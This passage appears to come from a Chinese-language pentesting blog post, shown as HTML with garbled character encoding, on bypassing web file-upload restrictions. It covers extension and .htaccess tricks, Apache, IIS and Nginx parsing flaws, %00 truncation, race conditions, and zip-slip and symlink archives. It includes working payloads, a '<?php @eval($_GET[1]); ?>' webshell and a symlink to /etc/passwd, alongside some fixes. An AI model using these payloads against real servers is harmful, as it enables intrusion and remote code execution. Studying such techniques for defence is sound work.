<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">       <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><ul><li><p>ä¸­é—´ä»¶é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è§£æå…¶ä»–è„šæœ¬åç¼€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line">.php3 .php4 .php5  .pht  .phtml  .phar  .shtml </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .shtml    </span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># jsp    </span></span><br><span class="line">.jsp .jspa .jsps .jspx </span><br><span class="line">    </span><br><span class="line"><span class="comment"># .net</span></span><br><span class="line">.asp  .asa .cdx  .cer  .aspx .asmx  .ashx</span><br></pre></td></tr></table></figure></li><li><p>å¯ä»¥ä¸Šä¼ ç›¸å…³é…ç½®æ–‡ä»¶</p><ul><li><p>.htaccess</p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">CTF.htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_.htaccess ctf_Y4tackerçš„åšå®¢-CSDNåšå®¢</a></p><p>åªèƒ½ç”¨äºApache</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å½“æ–‡ä»¶åä¸­åŒ…å«shellæ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šè¢«Apacheå½“ä½œphpè§£æ</span></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#.pngæ–‡ä»¶ä¹Ÿå¯ä»¥æ‰§è¡Œphpç¨‹åº</span></span><br><span class="line">AddType application/x-httpd-php .png </span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯äº†cgiæ‰©å±•ï¼šæ‰©å±•åä¸º.yyyçš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç†</span></span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .yyy</span><br></pre></td></tr></table></figure><p>ä¿®å¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨é…ç½®æ–‡ä»¶ä¸­å°†AllowOverride ALLæ”¹ä¸ºAllowOverride None</span><br></pre></td></tr></table></figure></li><li><p>.user.ini</p><p>ä½¿ç”¨æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apacheå’ŒNginxéƒ½å¯ä»¥ï¼Œåªéœ€æ»¡è¶³ï¼š</span><br><span class="line">æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGI</span><br><span class="line">FastCGIæ¨¡å¼</span><br><span class="line">ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=file_name  <span class="comment">#è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹å‰å…ˆè¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_append_file</span>=file_name  <span class="comment">#è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹åæ‰§è¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>è¿‡æ»¤ä¸å½“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€åç¼€åŒå†™ç»•è¿‡ã€åç¼€å¤§å°å†™ç»•è¿‡</span><br></pre></td></tr></table></figure></li><li><p>Apacheè§£ææ¼æ´</p><ul><li><p>ä»å³å¾€å·¦è§£ææ¼æ´</p><p>äº§ç”ŸåŸå› ï¼š</p><p>å‰æï¼š<strong>phpä½œä¸ºapacheçš„ä¸€ä¸ªå­æ¨¡å—æ¥è¿è¡Œ</strong></p><p><img src="/../images/image-20230617172156170.png" alt="image-20230617172156170"></p><p>apacheæ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ï¼Œå¦‚æœè¿ç»´äººå‘˜ç»™<code>.php</code> åç¼€å¢åŠ äº†å¤„ç†å™¨</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apacheä¼šä»å³å‘å·¦ï¼Œä¾æ¬¡è¯†åˆ«åç¼€ï¼Œç›´åˆ°é‡åˆ°è‡ªå·±èƒ½è§£æçš„æ–‡ä»¶åä¸ºæ­¢ã€‚é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰<code>.php</code> åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆ PHP æ–‡ä»¶ã€‚</p><p>å‡è®¾ä¸Šä¼ çš„æ–‡ä»¶åä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•ä¸º.phpï¼Œä¼šå°†å…¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè½»æ¾ç»•è¿‡<strong>é»‘ç™½åå•</strong>ã€‚</p><p>vulhubå¤ç°</p><p><img src="/../images/image-20230617172318530.png" alt="image-20230617172318530"></p><p>æœ¬åœ°cgiæ¨¡å¼å¤ç°</p></li></ul><p><img src="/../images/image-20230617172525788.png" alt="image-20230617172525788"></p><p><img src="/../images/image-20230617172355992.png" alt="image-20230617172355992"></p><ul><li><p>HTTPDæ¢è¡Œè§£ææ¼æ´â€“CVE-2017-15715</p><p>äº§ç”ŸåŸå› ï¼š</p><p>é…ç½®ä¸­çš„æ­£åˆ™ç¼ºé™·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­$ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥åŒ¹é…\n æˆ– \rï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ <code>.php\n</code>ç»•è¿‡<strong>é»‘åå•</strong>æ ¡éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¢«ä½œä¸ºPHPæ–‡ä»¶è§£æã€‚ï¼ˆä¸èƒ½æ˜¯<code>.php\r\n</code>ï¼‰</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸Šä¼ ï¼š1.php\x0a</span><br><span class="line">è®¿é—®ï¼š1.php%0a</span><br></pre></td></tr></table></figure></li></ul><p>ä¸Šè¿°æ¼æ´ä¿®å¤ï¼šå› ä¸ºApacheçš„è§£ææ¼æ´æ˜¯ç”±äºç•¸å½¢æ‰©å±•åå’Œç•¸å½¢æ–‡ä»¶åå¯¼è‡´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç™½åå•ï¼Œå¹¶å¯¹æ–‡ä»¶é‡å‘½åï¼Œæ–‡ä»¶å°±ä¸ä¼šå­˜åœ¨ç•¸å½¢å­—ç¬¦å’Œå¤šæ‰©å±•åçš„æƒ…å†µã€‚</p><p>å‚è€ƒå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]ä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å…¶ä»–æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="å›¾ç‰‡ç™½åå•ç»•è¿‡"><a href="#å›¾ç‰‡ç™½åå•ç»•è¿‡" class="headerlink" title="å›¾ç‰‡ç™½åå•ç»•è¿‡"></a>å›¾ç‰‡ç™½åå•ç»•è¿‡</h1><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li>phpç‰ˆæœ¬&lt;5.3.4</li><li>magic_quotes_gpcå…³é—­</li><li>ä¿å­˜çš„æ–‡ä»¶åå¯æ§</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>åç«¯ä½¿ç”¨<code>move_uploaded_file</code>æ¥ç§»åŠ¨æ–‡ä»¶ï¼Œ<code>move_uploaded_file</code>å‡½æ•°åº•å±‚ä¸ºcè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼ˆå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼‰</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–‡ä»¶å¤¹è§£ææ¼æ´</span><br><span class="line">ä¼šå°† *.asp/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å½“æˆAspè§£æ</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ†å·æˆªæ–­æ¼æ´</span><br><span class="line">é»˜è®¤ä¼šå°† *.asp;.jpg æ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆAspè§£æï¼ŒåŸç†æ˜¯æœåŠ¡å™¨é»˜è®¤ä¸è§£æ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚</span><br></pre></td></tr></table></figure></li></ul><p>ä¿®å¤æ–¹æ¡ˆï¼šIISæœåŠ¡å™¨æœ¬èº«ç¼ºé™·ï¼Œå‡çº§ç‰ˆæœ¬&#x2F;æ‰“è¡¥ä¸</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>æ–‡ä»¶ç±»å‹é”™è¯¯è§£ææ¼æ´ï¼ˆIIS7.xç‰ˆæœ¬åœ¨Fast-CGIè¿è¡Œæ¨¡å¼ä¸‹ä¹Ÿå­˜åœ¨ï¼‰</p><p>äº§ç”ŸåŸå› ï¼š</p><p><code>FastCGI</code>ä¸<code>PHP</code>å¯¹PATH_INFOå¤„ç†çš„å·®å¼‚ã€‚ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">ä¸Šä¼ å›¾ç‰‡ï¼Œè®¿é—®è·¯å¾„/å›¾ç‰‡è·¯å¾„/.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨php.iniä¸­è®¾ç½®fix_pathinfo=0 æˆ–è€…è®¾ç½®security.limit_extensions = .php</span><br><span class="line">æˆ–è€…</span><br><span class="line">åœ¨nginxçš„é…ç½®æ–‡ä»¶ä¸­è®¾ç½®fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>ç©ºå­—èŠ‚è§£ææ¼æ´ï¼ˆCVE-2013-4547ï¼‰</p><p>å—å½±å“ç‰ˆæœ¬ï¼š0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>äº§ç”ŸåŸå› ï¼š</p><p>nginxé…ç½®ä¸å½“</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">å½“ç”¨æˆ·è¯·æ±‚info.jpg%00.phpæ—¶ï¼Œå› ä¸ºinfo.jpg%00.phpèƒ½å¤ŸåŒ¹é…æ­£åˆ™&quot;.php$&quot;ï¼Œæ‰€ä»¥å¯ä»¥è¿›å…¥è¯¥<span class="section">location</span>å—ã€‚</span><br><span class="line">ä½†æ˜¯nginxåœ¨è§£ææ–‡ä»¶åæ—¶è¢«%<span class="number">00</span>æˆªæ–­ï¼Œå¯¼è‡´ä»¥ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯info.jpgå¹¶å‘ç»™fastcgiï¼Œæ‰€ä»¥fastcgiå°±å°†info.jpgå½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æäº†ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">ä¸Šä¼ æ–‡ä»¶ï¼šinfo.jpg</span><br><span class="line">è¯·æ±‚æ–‡ä»¶ï¼šinfo.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šå‡çº§ç‰ˆæœ¬</p></li></ul><h3 id="é…åˆæ–‡ä»¶åŒ…å«"><a href="#é…åˆæ–‡ä»¶åŒ…å«" class="headerlink" title="é…åˆæ–‡ä»¶åŒ…å«"></a>é…åˆæ–‡ä»¶åŒ…å«</h3><ul><li><p>å›¾ç‰‡ğŸ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ç»•è¿‡å®½é«˜æ£€æŸ¥</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>ç”¨æ•°æ®é‡å°çš„å›¾ç‰‡ï¼Œæ¯”å¦‚éšä¾¿æˆªä¸€å¼ å¾ˆå°çš„å›¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ™®é€šï¼šcopy,ç›´æ¥æ’å…¥</span><br><span class="line">äºŒæ¬¡æ¸²æŸ“ï¼šæ‰¾åˆ°å‰åå›¾ç‰‡ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„hexæ•°æ®ï¼Œæ›¿æ¢ä¸ºæœ¨é©¬</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶åŒ…å«trick</p></li></ul><h3 id="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"><a href="#é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–" class="headerlink" title="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"></a>é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–</h3><p>ä¸Šä¼ ä»»æ„åç¼€çš„pharæ ¼å¼çš„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ç”¨<code>phar://</code>è§£æ</p><h1 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h1><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_fileæˆåŠŸåæ‰åˆ¤æ–­æ˜¯å¦åˆæ³•</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸç†ï¼šæœåŠ¡ç«¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶åˆ é™¤å‰è®¿é—®webshellå†™å…¥æ–°çš„webshellå³å¯ã€‚</p><h1 id="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"><a href="#å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜" class="headerlink" title="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"></a>å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜</h1><p>æœåŠ¡ç«¯ä¼šå¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¯ä»¥æ„é€ æ¶æ„å‹ç¼©åŒ…æ”»å‡»</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><p>Linuxè½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y ä¿è¯è§£å‹å‡ºæ¥çš„è¿˜æ˜¯è½¯é“¾æ¥</span><br></pre></td></tr></table></figure><h2 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h2><ul><li><p>é€šè¿‡æ„é€ å‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶åï¼Œé€ æˆç›®å½•ç©¿è¶Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å·²å‘ç°å—<code>Zip Slip</code>å½±å“çš„é¡¹ç›®:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>æ³¨</strong>ï¼šå¦‚æœç”¨çš„æ˜¯å‘½ä»¤<code>unzip</code>æ¥è§£å‹ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡ç”¨äº†ï¼Œå› ä¸º<code>unzip</code> é»˜è®¤è·³è¿‡æ–‡ä»¶åä¸­çš„<code>../</code></p></li><li><p>è½¯é“¾æ¥çš„å¦™ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p></li></ul><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>Fromï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶å­—èŠ‚ï¼Œè®©å‹ç¼©åŒ…è§£å‹è¿‡ç¨‹å‡ºé”™ï¼Œä½†æ˜¯å‡ºé”™å‰å·²è§£å‹éƒ¨åˆ†å³ä¸ºwebshellã€‚ï¼ˆå‡ºé”™åæ•è·å¼‚å¸¸ï¼Œç¨‹åºä¸­æ­¢ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å·²è§£å‹éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆå·²è§£å‹å‡ºçš„webshellå°±å¯ä»¥ç•™åœ¨æœåŠ¡ç«¯ä¸­ï¼‰</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="ä¸Šä¼ æ¥å£å¯»æ‰¾"><a href="#ä¸Šä¼ æ¥å£å¯»æ‰¾" class="headerlink" title="ä¸Šä¼ æ¥å£å¯»æ‰¾"></a>ä¸Šä¼ æ¥å£å¯»æ‰¾</h1><ul><li><p>é€šè¿‡è§‚å¯Ÿå‘½åæ¥fuzzæ¥å£</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ æ¥å£æµ‹è¯•</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p><img src="/../images/image-20230605161933817.png" alt="image-20230605161933817"></p><h1 id="ä¸Šä¼ åé—®é¢˜"><a href="#ä¸Šä¼ åé—®é¢˜" class="headerlink" title="ä¸Šä¼ åé—®é¢˜"></a>ä¸Šä¼ åé—®é¢˜</h1><h3 id="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"><a href="#æ–‡ä»¶è·¯å¾„å¯»æ‰¾" class="headerlink" title="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"></a>æ–‡ä»¶è·¯å¾„å¯»æ‰¾</h3><p>From <a href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>å› ä¸ºä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡è¿™ç±»çš„æ€»å½’æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåœ¨webåº”ç”¨åˆ°å¤„ç‚¹ç‚¹ï¼Œå¤šåŠ è½½ä¸€äº›æ•°æ®åŒ…ï¼Œç„¶åå†åˆ°burpçš„http historyæœç´¢shellçš„åå­—</p></li><li><p><strong>è¿”å›äº†ä¸€äº›å‚æ•°ä½†ä¸åŒ…æ‹¬è·¯å¾„çš„æƒ…å†µ</strong>ï¼Œæ¯”å¦‚file_id ç­‰ç­‰ï¼Œé‚£ä¹ˆæ–‡ä»¶è·¯å¾„å¯èƒ½å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥<strong>ç»“åˆsqlæ³¨å…¥</strong> sqlmapçš„â€“search -Cå‚æ•°æ‰¾åˆ°å­—æ®µå’Œå€¼</p></li><li><p><strong>ä»€ä¹ˆéƒ½æ²¡è¿”å›çš„æƒ…å†µï¼Œåªè¿”å›äº†okï¼Œtrueç­‰ç­‰ã€‚é‡æ–°åŠ è½½ï¼ŒæŠ“åŒ…çœ‹å“åº”ï¼Œæˆ–è®¸æŸä¸ªæ¥å£çš„å“åº”å°±åŒ…æ‹¬å¯¹åº”çš„è·¯å¾„ã€‚</strong></p><p>æ¯”å¦‚å¤´åƒä½ç½®ä¸Šä¼ 